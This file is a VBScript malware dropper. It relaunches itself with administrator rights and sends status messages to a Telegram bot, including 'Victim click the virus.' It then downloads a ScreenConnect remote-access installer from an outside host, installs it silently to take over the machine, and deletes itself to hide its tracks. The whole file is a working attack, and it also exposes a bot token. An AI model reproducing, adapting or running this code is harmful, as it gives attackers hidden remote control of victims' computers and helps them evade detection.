' --- Elevation Check ---
If Not WScript.Arguments.Named.Exists("elev") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName,Chr(34)&WScript.ScriptFullName&Chr(34)&" /elev","","runas",1
    WScript.Quit
End If

On Error Resume Next
Set w = CreateObject("WScript.Shell")
p = w.ExpandEnvironmentStrings("%TEMP%\i9u2y0.msi")

' --- Telegram Configuration ---
tkn = "8538504145:AAHR0quG-5Fe8roXw4uL1eYUWMSJX7be8Hc"
cht = "1096574696"

Function URLEnc(s)
    URLEnc = Replace(s," ","%20")
End Function

Function TellTelegram(txt)
    Set req = CreateObject("WinHttp.WinHttpRequest.5.1")
    url = "https://api.telegram.org/bot" & tkn & "/sendMessage?chat_id=" & cht & "&text=" & URLEnc(txt)
    req.Open "GET", url, False
    req.Send
End Function

' --- Start Notification ---
TellTelegram("Victim click the virus.")

' --- Download Process (use a real URL here) ---
url = "https://con.new-file.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=veebss&c=&c=&c=&c=&c=&c=&c="
Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Option(6) = True
h.Open "GET", url, 0
h.Send

If h.Status <> 200 Then
    TellTelegram("Download failed. HTTP " & h.Status)
    WScript.Quit
End If

Set s = CreateObject("ADODB.Stream")
s.Type = 1
s.Open
s.Write h.ResponseBody
s.SaveToFile p, 2
s.Close

WScript.Sleep 2000

' --- Silent Installation ---
cmd = " /S"
If LCase(Right(p,4)) = ".msi" Then cmd = " /qn"
w.Run p & cmd, 0, True

' --- Completion Notification ---
TellTelegram("Done installing.")

' --- Cleanup ---
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName)